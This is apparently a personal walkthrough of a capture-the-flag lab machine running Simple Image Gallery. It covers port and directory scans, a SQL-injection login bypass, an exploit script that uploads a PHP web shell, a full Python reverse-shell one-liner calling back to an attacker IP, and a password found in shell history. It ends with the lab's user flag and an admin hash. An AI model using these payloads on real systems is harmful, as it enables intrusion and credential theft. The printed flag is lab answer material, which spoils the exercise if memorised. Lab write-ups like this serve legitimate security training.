nmap
```
└─$ sudo nmap -sX -Pn -sV 10.10.20.57
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-10 11:01 PDT
Nmap scan report for 10.10.20.57
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.37 seconds

```

10.10.20.57 redirects to `http://10.10.20.57/gallery/login.php`

gobuster 
```
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,js -u 10.10.20.57/gallery
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.20.57/gallery
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              js,php,txt,html
[+] Timeout:                 10s
===============================================================
2022/07/10 11:04:24 Starting gobuster in directory enumeration mode
===============================================================
/.hta.js              (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.hta.txt             (Status: 403) [Size: 276]
/.hta.html            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htaccess.html       (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htaccess.js         (Status: 403) [Size: 276]
/.htpasswd.html       (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htpasswd.js         (Status: 403) [Size: 276]
/404.html             (Status: 200) [Size: 198]
/albums               (Status: 301) [Size: 319] [--> http://10.10.20.57/gallery/albums/]
/archives             (Status: 301) [Size: 321] [--> http://10.10.20.57/gallery/archives/]
/assets               (Status: 301) [Size: 319] [--> http://10.10.20.57/gallery/assets/]  
/build                (Status: 301) [Size: 318] [--> http://10.10.20.57/gallery/build/]   
/classes              (Status: 301) [Size: 320] [--> http://10.10.20.57/gallery/classes/] 
/config.php           (Status: 200) [Size: 0]                                             
/create_account.php   (Status: 200) [Size: 8]                                             
/database             (Status: 301) [Size: 321] [--> http://10.10.20.57/gallery/database/]
/dist                 (Status: 301) [Size: 317] [--> http://10.10.20.57/gallery/dist/]    
/home.php             (Status: 500) [Size: 0]                                             
/inc                  (Status: 301) [Size: 316] [--> http://10.10.20.57/gallery/inc/]     
/index.php            (Status: 200) [Size: 16844]                                         
/index.php            (Status: 200) [Size: 16844]                                         
/login.php            (Status: 200) [Size: 7995]                                          
/plugins              (Status: 301) [Size: 320] [--> http://10.10.20.57/gallery/plugins/] 
/report               (Status: 301) [Size: 319] [--> http://10.10.20.57/gallery/report/]  
/uploads              (Status: 301) [Size: 320] [--> http://10.10.20.57/gallery/uploads/] 
/user                 (Status: 301) [Size: 317] [--> http://10.10.20.57/gallery/user/]    
```


searchsploit for Simple Image Gallery
```
└─$ searchsploit simple image gallery
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Joomla Plugin Simple Image Gallery Extended (SIGE) 3.5.3 - Multiple Vulnerabilities                                         | php/webapps/49064.txt
Joomla! Component Kubik-Rubik Simple Image Gallery Extended (SIGE) 3.2.3 - Cross-Site Scripting                             | php/webapps/44104.txt
Simple Image Gallery 1.0 - Remote Code Execution (RCE) (Unauthenticated)                                                    | php/webapps/50214.py
Simple Image Gallery System 1.0 - 'id' SQL Injection                                                                        | php/webapps/50198.txt
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

I read the exploit for 50214.py and saw it was doing a simple sql injection to bypass the login.php page, so I manually entered the sql injection code without using the exploit script.
`admin' or '1'='1'#` and I was able to login.

I tried out the exploit script and got RCE.

script
```
└─$ python3 *.py                                                                                                                                              
TARGET = 10.10.20.57:8080
Login Bypass
shell name TagonhhxovcfuuxhlliLetta

protecting user

User ID : 1
Firsname : Adminstrator
Lasname : Admin
Username : admin

shell uploading
- OK -
Shell URL : http://10.10.20.57/gallery/uploads/1657477080_TagonhhxovcfuuxhlliLetta.php?cmd=whoami

```
`http://10.10.20.57/gallery/uploads/1657477080_TagonhhxovcfuuxhlliLetta.php?cmd=whoami` and the response was `www-data`.

I then injected the below line into the `cmd=` parameter in the url, and I got a reverse shell.
`python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.248.108",1111));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`

I then tried to see `user.txt` but I need to be user `mike` to do so. I uploaded linpeas.sh and began enumerating the machine.

linpeas.sh
```
╔══════════╣ Searching passwords in history files
      @stats   = stats                                                                                                                                        
      @items   = { _seq_: 1  }
      @threads = { _seq_: "A" }
sudo -lb3stpassw0rdbr0xx
sudo -l
```

Ohhh, a password. I was able to su to `mike` using `b3stpassw0rdbr0xx`.

```
mike@gallery:~/documents$ sudo -l
Matching Defaults entries for mike on gallery:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh

```

user.txt == `THM{af05cd30bfed67849befd546ef}`


admin    | a228b12a08b6527e7978cbe5d914531c
